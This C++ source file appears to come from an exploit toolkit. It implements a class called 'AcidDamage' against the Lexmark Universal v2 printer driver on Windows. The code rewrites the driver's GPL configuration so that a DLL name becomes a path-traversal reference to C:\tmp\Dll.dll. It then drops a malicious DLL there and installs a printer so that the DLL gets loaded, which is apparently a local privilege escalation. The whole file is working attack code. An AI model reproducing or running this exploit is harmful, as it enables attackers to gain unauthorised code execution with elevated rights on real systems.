#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "inject_me.hpp"
#include "aciddamage.hpp"

namespace
{
    bool read_all(const std::string& p_path, std::string& p_content)
    {
        std::cout << "[+] Read in " << p_path << std::endl;

        std::ifstream gpl_file;
        gpl_file.open(p_path, std::ifstream::in);
        while (!gpl_file.is_open())
        {
            std::cout << "[-] Failed to open " << p_path << std::endl;
            return false;
        }

        while (gpl_file.good())
        {
            p_content.push_back(gpl_file.get());
        }

        gpl_file.close();
        return true;
    }

    bool overwrite_path(const std::string p_target, std::string& p_contents)
    {
        std::cout << "[+] Searching file contents " << std::endl;
        std::string target("<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">LMUD1OUE.DLL</GDL_ATTRIBUTE>");
        std::size_t pos = p_contents.find(target);
        if (pos == std::string::npos)
        {
            std::cout << "[-] Failed to find vulnerable string" << std::endl;
            return false;
        }

        std::cout << "[+] Updating file contents" << std::endl;
        p_contents.replace(pos, target.size(), "<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">..\\..\\..\\..\\..\\..\\tmp\\Dll.dll</GDL_ATTRIBUTE>");

        std::cout << "[+] Dropping updated gpl" << std::endl;
        std::ofstream ofs(p_target, std::ofstream::trunc);
        if (!ofs.is_open())
        {
            std::cerr << "[!] Failed to open " << p_target << " for writing" << std::endl;
            return false;
        }
        ofs << p_contents;
        ofs.flush();
        ofs.close();
        return true;
    }
}

AcidDamage::AcidDamage() :
    Exploit("Lexmark Universal v2", "AcidDamage"),
    m_target_directory("C:\\ProgramData\\Lexmark Universal v2\\"),
    m_target_dll("Universal Color Laser.gdl")
{
}

AcidDamage::~AcidDamage()
{
}

bool AcidDamage::do_exploit()
{
    if (!initialize_attack_space(m_target_directory))
    {
        return false;
    }

    std::string fcontents;
    if (!read_all(m_target_directory + m_target_dll, fcontents))
    {
        return false;
    }

    if (!overwrite_path(m_target_directory + m_target_dll, fcontents))
    {
        return false;
    }

    // drop inject_me to disk if no command line dll has been provided
    if (!m_custom_dll && !drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
    {
        return false;
    }

    std::cout << "[+] Staging dll in c:\\tmp" << std::endl;
    std::string tmp_dir("C:\\tmp\\");
    std::filesystem::create_directory(tmp_dir);
    try
    {
        std::filesystem::copy_file(m_malicious_dll, tmp_dir + "Dll.dll");
    }
    catch (const std::exception& e)
    {
        std::cout << "[-] " << e.what() << std::endl;
    }

    install_printer();

    if (!std::filesystem::exists("C:\\result.txt"))
    {
        if (m_custom_dll)
        {
            std::cout << "[+] Exploit complete." << std::endl;
        }
        else
        {
            std::cout << "[-] Failed! Oh no!" << std::endl;
        }
    }
    else
    {
        std::cout << "[!] Mucho success!" << std::endl;
    }

    // delete the directory / file so we can reexploit if we want
    std::filesystem::remove_all(m_target_directory);
    std::filesystem::remove_all(tmp_dir);
    return true;
}
